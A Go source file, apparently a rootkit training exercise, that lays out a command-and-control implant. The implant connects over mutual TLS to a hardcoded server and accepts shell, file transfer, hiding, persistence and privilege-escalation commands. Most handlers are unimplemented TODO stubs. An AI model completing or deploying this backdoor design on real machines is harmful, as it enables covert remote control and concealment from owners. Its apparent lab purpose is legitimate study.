package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

//go:embed certs/ca.crt
var caCert []byte

//go:embed certs/agent.crt
var agentCert []byte

//go:embed certs/agent.key
var agentKey []byte

const serverAddr = "10.0.2.2:443"

func main() {
	conn := dial()
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		line := scanner.Text()
		parts := strings.SplitN(line, " ", 2)
		cmd := parts[0]
		arg := ""
		if len(parts) > 1 {
			arg = parts[1]
		}

		switch cmd {
		case "PING":
			fmt.Fprintln(conn, "PONG")
		case "STATUS":
			// TODO: report PID, uid, uptime
		case "SHELL":
			handleShell(conn, arg)
		case "DOWNLOAD":
			handleDownload(conn, arg)
		case "UPLOAD":
			handleUpload(conn, scanner, arg)
		case "HIDE":
			handleHide(conn, arg)
		case "PERSIST":
			os.Mkdir("/tmp/rklings.persist", 0755)
			fmt.Fprintln(conn, "OK")
		case "ESCALATE":
			handleEscalate(conn, arg)
		default:
			fmt.Fprintf(conn, "ERR unknown: %s\n", cmd)
		}
	}
}

// dial establishes an mTLS connection to the server.
func dial() *tls.Conn {
	cert, err := tls.X509KeyPair(agentCert, agentKey)
	if err != nil {
		log.Fatalf("load agent cert: %v", err)
	}

	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM(caCert)

	conn, err := tls.Dial("tcp", serverAddr, &tls.Config{
		Certificates: []tls.Certificate{cert},
		RootCAs:      pool,
		MinVersion:   tls.VersionTLS13,
	})
	if err != nil {
		log.Fatalf("dial: %v", err)
	}
	return conn
}

// handleShell executes a command via sh -c and sends output.
// Output lines end with a single dot on its own line.
func handleShell(conn *tls.Conn, cmd string) {
	// TODO: exec.Command("sh", "-c", cmd), capture combined output,
	//       send each line, then send ".\n" as terminator
}

// handleDownload sends a file: size line, then raw bytes.
func handleDownload(conn *tls.Conn, path string) {
	// TODO: stat the file for size, send decimal size line,
	//       then io.Copy the file contents
}

// handleUpload receives a file: size line, then raw bytes.
func handleUpload(conn *tls.Conn, scanner *bufio.Scanner, path string) {
	// TODO: read size line from scanner, parse as int64,
	//       create file, io.CopyN from conn for exactly size bytes
}

// handleHide dispatches HIDE subcommands to mkdir.
// Format: "HIDE FILE <name>", "HIDE PID <pid>", "HIDE PORT <port>", "HIDE CONTENT <str>"
func handleHide(conn *tls.Conn, arg string) {
	parts := strings.SplitN(arg, " ", 2)
	if len(parts) < 2 {
		fmt.Fprintln(conn, "ERR need: HIDE <type> <value>")
		return
	}

	// TODO: map type to mkdir command prefix (FILE->h.f, PID->h.i, PORT->h.p, CONTENT->h.c)
	//       then os.Mkdir("/tmp/rklings.<prefix>.<value>", 0755)
}

// handleEscalate triggers privilege escalation via mkdir.
func handleEscalate(conn *tls.Conn, arg string) {
	// TODO: if arg is empty, mkdir rklings.e; otherwise mkdir rklings.e.<arg>
}

// Ensure imports compile.
var _ = io.Copy
var _ = os.Stat
var _ = exec.Command
var _ = strconv.ParseInt
